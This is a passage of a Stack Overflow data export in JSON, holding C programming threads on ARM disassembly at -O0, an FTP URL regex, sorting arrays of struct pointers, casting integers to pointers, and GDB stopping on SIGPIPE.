"registered", "profile_image": "https://i.stack.imgur.com/P0peM.png?s=128&g=1", "display_name": "Ross Ridge", "link": "https://stackoverflow.com/users/3826372/ross-ridge"}, "edited": false, "score": 0, "creation_date": 1449700429, "post_id": 34189516, "comment_id": 56126961, "body": "@RossRidge I was starting to go in the right direction based on your hint and then I saw user3386109&#39;s answer. Thank you! Case closed."}, {"owner": {"reputation": 1068, "user_id": 492520, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/2ddf2ce3e4bb2499b3759ed779c48813?s=128&d=identicon&r=PG", "display_name": "Dmitri", "link": "https://stackoverflow.com/users/492520/dmitri"}, "edited": false, "score": 2, "creation_date": 1449700734, "post_id": 34189516, "comment_id": 56127097, "body": "Two lessons I learned here: 1. The compiler need not be straightforward about anything even with -O0. 2. Code generated with -O0 is a lot worse than I would have guessed."}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 1, "creation_date": 1449701203, "post_id": 34189516, "comment_id": 56127309, "body": "Yup, unoptimized code can be pretty bad. The compiler typically wastes a lot of time loading/storing variables on the stack, and it finds other ways to waste time too :)"}, {"owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "edited": false, "score": 0, "creation_date": 1449782452, "post_id": 34189516, "comment_id": 56168155, "body": "If you want to look at code that isn&#39;t horrible, and mostly does what the source code says (without aggressive loop tranformations or optimizing stuff away), use <code>-Og</code> (optimize for debugging).  <code>-O0</code> spills everything to memory after every C statement.  (I guess for the benefit of stupid debuggers / debug-info formats that can&#39;t find variable values in registers)"}], "answers": [{"comments": [{"owner": {"reputation": 1068, "user_id": 492520, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/2ddf2ce3e4bb2499b3759ed779c48813?s=128&d=identicon&r=PG", "display_name": "Dmitri", "link": "https://stackoverflow.com/users/492520/dmitri"}, "edited": false, "score": 0, "creation_date": 1449700317, "post_id": 34190227, "comment_id": 56126905, "body": "AAH! So when the condition is true the number in r3 is negative and therefore less than zero! That&#39;s genius! Thank you, I can sleep tonight!"}, {"owner": {"reputation": 18029, "user_id": 3156750, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/73e00c291e7b746a34f28622a64f0492?s=128&d=identicon&r=PG&f=1", "display_name": "Notlikethat", "link": "https://stackoverflow.com/users/3156750/notlikethat"}, "edited": false, "score": 5, "creation_date": 1449700377, "post_id": 34190227, "comment_id": 56126933, "body": "It&#39;s perhaps noteworthy that a <code>uxtb</code> for the load is trebly stupid since <code>ldrb</code> already zero-extends the value, and that it makes more sense when you know <code>ge</code> (&quot;greater than or equal&quot;) is specifically a <i>signed</i> interpretation of the flags (as opposed to <code>hs</code>, which is <i>unsigned</i> &quot;higher or same&quot;)."}, {"owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "edited": false, "score": 1, "creation_date": 1449782927, "post_id": 34190227, "comment_id": 56168399, "body": "gcc does pretty much all of its optimization on an intermediate representation of what the code does, not on a sequence of anything like target-machine instructions (ARM in this case).  As <a href=\"http://stackoverflow.com/a/33284629/224132\">stackoverflow.com/a/33284629/224132</a> explains, producing an executable from its internal representation after parsing requires some transformations of the internal representation.  gcc doesn&#39;t have a mode that tries to literally translate C to ARM.  So you get some &quot;clever&quot; stuff even at <code>-O0</code>, because that&#39;s the only way gcc knows how to do some things.  It doesn&#39;t have the dumb way programmed in."}], "tags": [], "owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "is_accepted": true, "score": 6, "last_activity_date": 1449700109, "creation_date": 1449700109, "answer_id": 34190227, "question_id": 34189516, "link": "https://stackoverflow.com/questions/34189516/how-does-this-disassembly-correspond-to-the-given-c-code/34190227#34190227", "title": "How does this disassembly correspond to the given C code?", "body": "<p>The two <code>uxtb</code> instructions are the compiler being stupid, they should be optimized out if you turn on optimization. The <code>sxtb</code> is the compiler being brilliant, using a trick that you wouldn't expect in unoptimized code.</p>\n\n<p>The first <code>uxtb</code> is due to the fact that you loaded a byte from memory. The compiler is zeroing the other 24 bits of register r3, so that the byte value fills the entire register.</p>\n\n<p>The second <code>uxtb</code> is due to the fact that you're ANDing with an 8-bit value. The compiler realizes that the upper 24-bits of the result will always be zero, so it's using <code>uxtb</code> to clear the upper 24-bits.</p>\n\n<p>Neither of the <code>uxtb</code> instructions does anything useful, because the <code>sxtb</code> instruction overwrites the upper 24 bits of <code>r3</code> anyways. The optimizer should realize that and remove them when you compile with optimizations enabled.</p>\n\n<p>The <code>sxtb</code> instruction takes the one bit you care about <code>0x80</code> and moves it into the sign bit of register <code>r3</code>. That way, if bit <code>0x80</code> is set, then <code>r3</code> becomes a negative number. So now the compiler can compare with <code>0</code> to determine whether the bit was set. If the bit was <em>not</em> set then the <code>bge</code> instruction branches back to the top of the <code>while</code> loop.</p>\n"}], "owner": {"reputation": 1068, "user_id": 492520, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/2ddf2ce3e4bb2499b3759ed779c48813?s=128&d=identicon&r=PG", "display_name": "Dmitri", "link": "https://stackoverflow.com/users/492520/dmitri"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1169, "favorite_count": 0, "accepted_answer_id": 34190227, "answer_count": 1, "score": 2, "last_activity_date": 1449700954, "creation_date": 1449697256, "last_edit_date": 1449700954, "question_id": 34189516, "link": "https://stackoverflow.com/questions/34189516/how-does-this-disassembly-correspond-to-the-given-c-code", "title": "How does this disassembly correspond to the given C code?", "body": "<p>Environment: GCC 4.7.3 (arm-none-eabi-gcc) for ARM Cortex m4f. Bare-metal (actually MQX RTOS, but here that's irrelevant). The CPU is in Thumb state.</p>\n\n<p>Here's a disassembler listing of some code I'm looking at:</p>\n\n<pre><code>//.label flash_command\n// ...\nwhile(!(FTFE_FSTAT &amp; FTFE_FSTAT_CCIF_MASK)) {}\n// Compiles to:\n12: bf00        nop\n14: f04f 0300   mov.w   r3, #0\n18: f2c4 0302   movt    r3, #16386  ; 0x4002\n1c: 781b        ldrb    r3, [r3, #0]\n1e: b2db        uxtb    r3, r3\n20: b2db        uxtb    r3, r3\n22: b25b        sxtb    r3, r3\n24: 2b00        cmp r3, #0\n26: daf5        bge.n   14 &lt;flash_command+0x14&gt;\n</code></pre>\n\n<p>The constants (after expending macros, etc.) are:</p>\n\n<pre><code>address of FTFE_FSTAT is 0x40020000u\nFTFE_FSTAT_CCIF_MASK is 0x80u\n</code></pre>\n\n<p>This is compiled with NO optimization (-O0), so <em>GCC shouldn't be doing anything fancy...</em> and yet, I don't get this code. <strong>Post-answer edit: Never assume this. My problem was getting a false sense of security from turning off optimization.</strong></p>\n\n<p>I've read that \"uxtb r3,r3\" is a common way of truncating a 32-bit value. Why would you want to truncate it twice and then sign-extend? And how in the world is this equivalent to the bit-masking operation in the C-code? </p>\n\n<p>What am I missing here?</p>\n\n<p>Edit: Types of the thing involved:\nSo the actual macro expansion of FTFE_FSTAT comes down to </p>\n\n<pre><code>((((FTFE_MemMapPtr)0x40020000u))-&gt;FSTAT)\n</code></pre>\n\n<p>where the struct is defined as </p>\n\n<pre><code>/** FTFE - Peripheral register structure */\ntypedef struct FTFE_MemMap {\n    uint8_t FSTAT; /**&lt; Flash Status Register, offset: 0x0 */\n    uint8_t FCNFG; /**&lt; Flash Configuration Register, offset: 0x1 */\n    //... a bunch of other uint_8\n} volatile *FTFE_MemMapPtr;\n</code></pre>\n"}, {"tags": ["c", "regex", "url", "ftp", "posix"], "comments": [{"owner": {"reputation": 4445, "user_id": 560903, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d66cec4f7bd065097137c2001c96b866?s=128&d=identicon&r=PG", "display_name": "keithmo", "link": "https://stackoverflow.com/users/560903/keithmo"}, "edited": false, "score": 0, "creation_date": 1449699040, "post_id": 34189307, "comment_id": 56126278, "body": "FYI: The <code>:&lt;password&gt;</code> and <code>&#47;&lt;url-path&gt;</code> components are optional, and a <code>:&lt;port&gt;</code> component may also be specified immediately after the <code>&lt;host&gt;</code> component. Thus <code>ftp:&#47;&#47;user@host</code> and <code>ftp:&#47;&#47;user@host:123</code> are both valid FTP URLs. This may or may not be relevant depending on your specific situation, of course."}, {"owner": {"reputation": 533, "user_id": 4036734, "user_type": "registered", "accept_rate": 72, "profile_image": "https://www.gravatar.com/avatar/7a67fba7d978d83be21f139b6bf5ae22?s=128&d=identicon&r=PG&f=1", "display_name": "Pedro Romano Barbosa", "link": "https://stackoverflow.com/users/4036734/pedro-romano-barbosa"}, "reply_to_user": {"reputation": 4445, "user_id": 560903, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d66cec4f7bd065097137c2001c96b866?s=128&d=identicon&r=PG", "display_name": "keithmo", "link": "https://stackoverflow.com/users/560903/keithmo"}, "edited": false, "score": 0, "creation_date": 1449703959, "post_id": 34189307, "comment_id": 56128433, "body": "I know, that&#39;s why I use 2 of them. I check the first and if it doesn&#39;t match I check the other."}], "answers": [{"comments": [{"owner": {"reputation": 533, "user_id": 4036734, "user_type": "registered", "accept_rate": 72, "profile_image": "https://www.gravatar.com/avatar/7a67fba7d978d83be21f139b6bf5ae22?s=128&d=identicon&r=PG&f=1", "display_name": "Pedro Romano Barbosa", "link": "https://stackoverflow.com/users/4036734/pedro-romano-barbosa"}, "edited": false, "score": 0, "creation_date": 1449704044, "post_id": 34189435, "comment_id": 56128463, "body": "Thank you. I&#39;m not concerned with special cases. This one should do."}], "tags": [], "owner": {"reputation": 907, "user_id": 4564746, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Im4Oc.jpg?s=128&g=1", "display_name": "aaron_world_traveler", "link": "https://stackoverflow.com/users/4564746/aaron-world-traveler"}, "is_accepted": true, "score": 1, "last_activity_date": 1449698431, "last_edit_date": 1449698431, "creation_date": 1449696916, "answer_id": 34189435, "question_id": 34189307, "link": "https://stackoverflow.com/questions/34189307/ftp-url-regular-expression-in-c-posix/34189435#34189435", "title": "FTP url regular expression in C POSIX", "body": "<p>This regex will match both patterns you've specified:</p>\n\n<pre><code>ftp://([a-z0-9]+:[a-z0-9]+@)?([\\\\.a-z0-9]+)/([\\\\./a-z0-9]+)$\n</code></pre>\n\n<p>Though, I should also mention that your patterns (and thus this one), also match many invalid url formats, and miss some valid ones.  I'll leave that to you, but at least you can see the way to make the <code>user:pass@</code> part optional in my example here.</p>\n"}], "owner": {"reputation": 533, "user_id": 4036734, "user_type": "registered", "accept_rate": 72, "profile_image": "https://www.gravatar.com/avatar/7a67fba7d978d83be21f139b6bf5ae22?s=128&d=identicon&r=PG&f=1", "display_name": "Pedro Romano Barbosa", "link": "https://stackoverflow.com/users/4036734/pedro-romano-barbosa"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2503, "favorite_count": 1, "accepted_answer_id": 34189435, "answer_count": 1, "score": 0, "last_activity_date": 1449698431, "creation_date": 1449696388, "question_id": 34189307, "link": "https://stackoverflow.com/questions/34189307/ftp-url-regular-expression-in-c-posix", "title": "FTP url regular expression in C POSIX", "body": "<p>I'm trying to make a simple FTP url parser with the help of POSIX regex.I'm using ERE(Extended Regular Expressions). I came up with 2 regular expressions(one for when the user types the username and the password and another for anonymous):</p>\n\n<pre><code>/* ftp syntax */\nftp://[&lt;user&gt;:&lt;password&gt;@]&lt;host&gt;/&lt;url-path&gt;\n\n\n/* The regular expression pattern (might be changed) */\nconst char* pattern = \"ftp://(([a-z0-9]+):([a-z0-9]+)@)*([\\\\.a-z0-9]+)/([\\\\./a-z0-9]+)$\";\n\n/* The anonymous one */\nconst char* patternAnon = \"ftp://([\\\\.a-z0-9]+)/([\\\\./a-z0-9]+)$\";\n</code></pre>\n\n<p>My main difficulty is trying to combine the two of them into one single regular expression. Thank you.</p>\n"}, {"tags": ["c", "arrays", "sorting", "pointers", "tree"], "comments": [{"owner": {"reputation": 22874, "user_id": 3282056, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/IXonK.jpg?s=128&g=1", "display_name": "rcgldr", "link": "https://stackoverflow.com/users/3282056/rcgldr"}, "edited": false, "score": 0, "creation_date": 1449695201, "post_id": 34188908, "comment_id": 56124264, "body": "instead of sorting the structs, sort the array of pointers according to values in the structs. For insertions, do a binary search into the array of pointers, then shift all &quot;higher&quot; pointers up by one to create an empty slot for the new pointer."}], "answers": [{"comments": [{"owner": {"reputation": 115, "user_id": 5430956, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/b317c8e3cc4277f7913d6231877f5eb4?s=128&d=identicon&r=PG&f=1", "display_name": "oodles2do", "link": "https://stackoverflow.com/users/5430956/oodles2do"}, "edited": false, "score": 0, "creation_date": 1449695476, "post_id": 34189003, "comment_id": 56124379, "body": "Thanks! I&#39;ll give it a go, great idea."}, {"owner": {"reputation": 115, "user_id": 5430956, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/b317c8e3cc4277f7913d6231877f5eb4?s=128&d=identicon&r=PG&f=1", "display_name": "oodles2do", "link": "https://stackoverflow.com/users/5430956/oodles2do"}, "edited": false, "score": 0, "creation_date": 1449697211, "post_id": 34189003, "comment_id": 56125334, "body": "How would I go about creating an array of pointers that point to an array of structures? Element by element, just been trying it and I can&#39;t do it :/"}, {"owner": {"reputation": 16851, "user_id": 5460719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e0f2a855c86ad12fc2988d3948b69ec6?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Karzes", "link": "https://stackoverflow.com/users/5460719/tom-karzes"}, "reply_to_user": {"reputation": 115, "user_id": 5430956, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/b317c8e3cc4277f7913d6231877f5eb4?s=128&d=identicon&r=PG&f=1", "display_name": "oodles2do", "link": "https://stackoverflow.com/users/5430956/oodles2do"}, "edited": false, "score": 0, "creation_date": 1449702690, "post_id": 34189003, "comment_id": 56127943, "body": "Allocate the array of pointers.  Then iterate over each pointer in the array, allocating a struct and storing its address at that array position.  You can use <code>malloc</code> for both the array and the structs.  If you later need to grow the array, you can use <code>realloc</code>."}], "tags": [], "owner": {"reputation": 16851, "user_id": 5460719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e0f2a855c86ad12fc2988d3948b69ec6?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Karzes", "link": "https://stackoverflow.com/users/5460719/tom-karzes"}, "is_accepted": true, "score": 0, "last_activity_date": 1449695273, "creation_date": 1449695273, "answer_id": 34189003, "question_id": 34188908, "link": "https://stackoverflow.com/questions/34188908/pointers-and-sorting/34189003#34189003", "title": "Pointers and sorting", "body": "<p>Instead of using an array of structs, you can use an array of pointers to structs, individually allocating the struct instances.  Then you can sort the array of pointers without changing the addresses of any of the structs it points to.  That way, pointers to the structs will remain valid.</p>\n"}, {"comments": [{"owner": {"reputation": 115, "user_id": 5430956, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/b317c8e3cc4277f7913d6231877f5eb4?s=128&d=identicon&r=PG&f=1", "display_name": "oodles2do", "link": "https://stackoverflow.com/users/5430956/oodles2do"}, "edited": false, "score": 0, "creation_date": 1449695482, "post_id": 34189030, "comment_id": 56124382, "body": "Thanks! I&#39;ll give it a go, great idea."}, {"owner": {"reputation": 115, "user_id": 5430956, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/b317c8e3cc4277f7913d6231877f5eb4?s=128&d=identicon&r=PG&f=1", "display_name": "oodles2do", "link": "https://stackoverflow.com/users/5430956/oodles2do"}, "edited": false, "score": 0, "creation_date": 1449698089, "post_id": 34189030, "comment_id": 56125790, "body": "How would I go about creating an array of pointers that point to an array of structures? Element by element, just been trying it and I can&#39;t do it :/"}], "tags": [], "owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "is_accepted": false, "score": 0, "last_activity_date": 1449695376, "creation_date": 1449695376, "answer_id": 34189030, "question_id": 34188908, "link": "https://stackoverflow.com/questions/34188908/pointers-and-sorting/34189030#34189030", "title": "Pointers and sorting", "body": "<p>If you have an array of structs then sorting that array implies moving its elements around in memory, except if the array starts out already in order.  If you move an object then you inherently invalidate any existing pointers to it.  If that is not evident to you, then meditate on what a pointer is and what moving an object means.</p>\n\n<p>One alternative would be to maintain and sort an array of pointers to your structs, instead of sorting the structs themselves.  In that case you would be moving only the pointers, not the things they point to, therefore the pointers to your structs would not be invalidated.</p>\n"}], "owner": {"reputation": 115, "user_id": 5430956, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/b317c8e3cc4277f7913d6231877f5eb4?s=128&d=identicon&r=PG&f=1", "display_name": "oodles2do", "link": "https://stackoverflow.com/users/5430956/oodles2do"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 52, "favorite_count": 0, "accepted_answer_id": 34189003, "answer_count": 2, "score": 0, "last_activity_date": 1449695376, "creation_date": 1449694913, "question_id": 34188908, "link": "https://stackoverflow.com/questions/34188908/pointers-and-sorting", "title": "Pointers and sorting", "body": "<p>I have a problem where I use pointers to point to an array of structs. It works perfectly well, but I need to add to this array and re-sort it on every pass, because of this my pointers will effectively change which characters they're pointing to as they're pointing to the same array index.</p>\n\n<p>Is there any way I can get around this? I've been trying with another array, but I still have the problem where I need to insert new element to the existing array and re-sort it.</p>\n"}, {"tags": ["c++", "c", "pointers"], "comments": [{"owner": {"reputation": 149509, "user_id": 4342498, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/l3j88.jpg?s=128&g=1", "display_name": "NathanOliver", "link": "https://stackoverflow.com/users/4342498/nathanoliver"}, "edited": false, "score": 1, "creation_date": 1449694717, "post_id": 34188798, "comment_id": 56124016, "body": "Please format you code as code."}, {"owner": {"reputation": 68702, "user_id": 1593860, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1361e47a8bf06d20ffda9a686ceb7e68?s=128&d=identicon&r=PG", "display_name": "Pete Becker", "link": "https://stackoverflow.com/users/1593860/pete-becker"}, "edited": false, "score": 3, "creation_date": 1449694735, "post_id": 34188798, "comment_id": 56124026, "body": "You can do <code>*(int*)x</code>, that is, tell the compiler to pretend that that integer value is a pointer, and dereference it."}, {"owner": {"reputation": 339644, "user_id": 118068, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/077db5466d3b58e7bbbd498dca173f04?s=128&d=identicon&r=PG", "display_name": "Marc B", "link": "https://stackoverflow.com/users/118068/marc-b"}, "edited": false, "score": 0, "creation_date": 1449694855, "post_id": 34188798, "comment_id": 56124090, "body": "technically any number can be used as a pointer. after all, a pointer is really just a number representing a memory address. but you still have to tell the compiler to treat that number as a pointer, because &quot;2 as memory address&quot; and &quot;2 as integer&quot; as essentially indistinguishable. they&#39;re both just numbers. it&#39;s the CONTEXT in which you&#39;re using them that matters."}, {"owner": {"reputation": 301, "user_id": 4349614, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-rGQvLlUWH3o/AAAAAAAAAAI/AAAAAAAAABE/jIxaQ_wzPUA/photo.jpg?sz=128", "display_name": "Ternvein", "link": "https://stackoverflow.com/users/4349614/ternvein"}, "edited": false, "score": 0, "creation_date": 1449695071, "post_id": 34188798, "comment_id": 56124194, "body": "And because pointers also have a type. You theoretically can dereference anything you want, even a 8-byte string interpreted as your <code>uint64_t</code>, but it may (and most likely will) lead you to many problems."}, {"owner": {"reputation": 12180, "user_id": 3150802, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/ulVTa.png?s=128&g=1", "display_name": "Peter - Reinstate Monica", "link": "https://stackoverflow.com/users/3150802/peter-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1449695481, "post_id": 34188798, "comment_id": 56124381, "body": "If you access hardware or configure a CPU it&#39;s often done by accessing specific addresses which are hard coded numerical values in the program and then assigned to pointers, and then dereferenced through the pointers. I think that just casting is an equivalent conversion."}, {"owner": {"reputation": 1644, "user_id": 376507, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/0251b66fdb998df69a7ab5f29a6b9552?s=128&d=identicon&r=PG&f=1", "display_name": "user376507", "link": "https://stackoverflow.com/users/376507/user376507"}, "edited": false, "score": 1, "creation_date": 1449695709, "post_id": 34188798, "comment_id": 56124496, "body": "I just realized that <i>(int</i>)x works when x is of type uint64_t. However if x is of type double and double also holds 8 bytes, I get compilation error saying &quot;error: operand of type &#39;double&#39; cannot be cast to a pointer type&quot;"}], "answers": [{"tags": [], "owner": {"reputation": 55924, "user_id": 5245033, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/6dbfd37ccb940fd2afcd49e966ad97e4?s=128&d=identicon&r=PG&f=1", "display_name": "SergeyA", "link": "https://stackoverflow.com/users/5245033/sergeya"}, "is_accepted": false, "score": 0, "last_activity_date": 1449694852, "creation_date": 1449694852, "answer_id": 34188887, "question_id": 34188798, "link": "https://stackoverflow.com/questions/34188798/dereferencing-value-in-variable-as-pointer-address/34188887#34188887", "title": "Dereferencing value in variable as pointer address", "body": "<p>Because C++ is not assembly language. In assembly you can do whatever you want with the registers - you can 'dereference' them (use as indirect operands) or multiply. Chip could not care less.</p>\n\n<p>C++, as a high level language, aims to help developer. If you want something to be a dereferencable address, you type it as such, and C++ prevents you from accidentally doing something which you can't do with an address. This is a very big advantage.</p>\n"}, {"comments": [{"owner": {"reputation": 41213, "user_id": 215568, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b05685e6c3945f4bd23bf1f967861aeb?s=128&d=identicon&r=PG", "display_name": "Donnie", "link": "https://stackoverflow.com/users/215568/donnie"}, "edited": false, "score": 0, "creation_date": 1449695216, "post_id": 34188922, "comment_id": 56124268, "body": "<code>uintptr_t</code> is important.  Also, C++ is much, much more type safe than C.  This is by design."}], "tags": [], "owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "is_accepted": false, "score": 4, "last_activity_date": 1449694966, "creation_date": 1449694966, "answer_id": 34188922, "question_id": 34188798, "link": "https://stackoverflow.com/questions/34188798/dereferencing-value-in-variable-as-pointer-address/34188922#34188922", "title": "Dereferencing value in variable as pointer address", "body": "<p>You <strong>can</strong> do <code>*(int*)x</code>, and it will fetch the <code>int</code> at memory location <code>x</code>. I don't think this is officially supported in the C standard, but in practice it <em>usually</em> works on <em>most</em> implementations.</p>\n\n<p>Part of the point of the type system is to stop you from making mistakes. <em>Usually</em> you don't want to dereference a <code>uint64_t</code>, so if you do it's probably because you made a mistake, and the compiler will point out the mistake for you.</p>\n\n<p>By the way, <code>uintptr_t</code> is an unsigned integer type that's the same size of a pointer. Don't rely on <code>uint64_t</code> being the same size as a pointer, if you ever want to be able to run your code on another CPU architecture.</p>\n"}], "owner": {"reputation": 1644, "user_id": 376507, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/0251b66fdb998df69a7ab5f29a6b9552?s=128&d=identicon&r=PG&f=1", "display_name": "user376507", "link": "https://stackoverflow.com/users/376507/user376507"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 998, "favorite_count": 1, "answer_count": 2, "score": -1, "last_activity_date": 1449694966, "creation_date": 1449694543, "last_edit_date": 1449694820, "question_id": 34188798, "link": "https://stackoverflow.com/questions/34188798/dereferencing-value-in-variable-as-pointer-address", "title": "Dereferencing value in variable as pointer address", "body": "<p>Why is it that only pointers can be dereferenced. When we have a character pointer, lets say \"p\" and we do a \"*p\" operation, it means go fetch the contents of the address location stored in p. In the end what we are asking here is to go and fetch the contents of a \"certain value\" by treating this value as address.</p>\n\n<p>Now assume that an integer pointer \"p\" that takes 8 bytes in certain architecture. Assume \"p\" holds the address of an integer variable \"a\"(int *p = &amp;a). Now if I have a variable \"x\" of size uint64_t, then essentially this variable can hold 8 bytes of data. i.e. \"memcpy(&amp;x, &amp;p, 8)\", I am copying the address location stored in \"p\" to \"x\". In c programming we can dereference a pointer using \"*p\" and we get the value of \"a\". Why is it that we cannot do something like *((int*)x) and get the value of \"a\".</p>\n"}, {"tags": ["c", "gdb"], "comments": [{"owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 1, "creation_date": 1449694253, "post_id": 34188693, "comment_id": 56123773, "body": "Is the socket still connected?"}, {"owner": {"reputation": 258, "user_id": 3456413, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/1fALy.png?s=128&g=1", "display_name": "Eric Siegal", "link": "https://stackoverflow.com/users/3456413/eric-siegal"}, "reply_to_user": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 0, "creation_date": 1449694286, "post_id": 34188693, "comment_id": 56123796, "body": "The connection crashes once it hits this error."}, {"owner": {"reputation": 6882, "user_id": 3403834, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/xpA5S.jpg?s=128&g=1", "display_name": "user58697", "link": "https://stackoverflow.com/users/3403834/user58697"}, "edited": false, "score": 0, "creation_date": 1449695193, "post_id": 34188693, "comment_id": 56124263, "body": "<code>write</code> generates <code>SIGPIPE</code> when the socket is closed at the other side. Check what is going on there."}], "answers": [{"tags": [], "owner": {"reputation": 88499, "user_id": 650405, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/5cdee2abea51e91756076032f0053081?s=128&d=identicon&r=PG", "display_name": "Karoly Horvath", "link": "https://stackoverflow.com/users/650405/karoly-horvath"}, "is_accepted": false, "score": 3, "last_activity_date": 1449705571, "last_edit_date": 1495540442, "creation_date": 1449704346, "answer_id": 34191124, "question_id": 34188693, "link": "https://stackoverflow.com/questions/34188693/why-does-gdb-break-when-writing-to-the-network/34191124#34191124", "title": "Why does GDB break when writing to the network?", "body": "<p><code>SIGPIPE</code> is generated when the other side closed the connection. And there are <a href=\"https://stackoverflow.com/questions/8369506/why-does-sigpipe-exist\">good reasons</a> for its existence.</p>\n\n<p>By default gdb catches <code>SIGPIPE</code>.</p>\n\n<p>If you aren't interested, and chances are you don't, simply disable it:</p>\n\n<pre><code>handle SIGPIPE nostop noprint pass\n</code></pre>\n\n<blockquote>\n  <p>I've been told that this happens when the socket is closed from the remote end, but how would that be happening.</p>\n</blockquote>\n\n<p>You mean why? Since you don't have the source we can only guess.</p>\n\n<p>Perhaps it already sent all the data it wanted and closed the connection, because there's no point keeping it open... Remember, connections can be <a href=\"https://superuser.com/questions/298919/what-is-tcp-half-open-connection-and-tcp-half-closed-connection\">half-closed</a> (that is, from one side). The server doesn't want to read any further, and just waits you to read the data and close your side. Probably nothing went wrong - but you have to decide that yourself, as only you know what the application protocol is.</p>\n"}], "owner": {"reputation": 258, "user_id": 3456413, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/1fALy.png?s=128&g=1", "display_name": "Eric Siegal", "link": "https://stackoverflow.com/users/3456413/eric-siegal"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 969, "favorite_count": 1, "answer_count": 1, "score": 1, "last_activity_date": 1449705571, "creation_date": 1449694200, "last_edit_date": 1449703766, "question_id": 34188693, "link": "https://stackoverflow.com/questions/34188693/why-does-gdb-break-when-writing-to-the-network", "title": "Why does GDB break when writing to the network?", "body": "<p>I get this error every time my program reaches a <code>write()</code> function. The program will continue again, but will stop on the next <code>write()</code> call. When I run this program outside of gdb, it runs properly.</p>\n\n<pre><code>Program received signal SIGPIPE, Broken pipe.\n0x00007ffff794b340 in __write_nocancel () at ../sysdeps/unix/syscall-template.S:81\n81      ../sysdeps/unix/syscall-template.S: No such file or directory.\n</code></pre>\n\n<p>I've been told that this happens when the socket is closed from the remote end, but how would that be happening.</p>\n\n<p>Note: The server and client are both running on the same machine, and the server was prebuilt for me, so I don't have access to it's code.</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 5542, "user_id": 1076451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/ZTP3Q.jpg?s=128&g=1", "display_name": "Chimera", "link": "https://stackoverflow.com/users/1076451/chimera"}, "edited": false, "score": 2, "creation_date": 1449693949, "post_id": 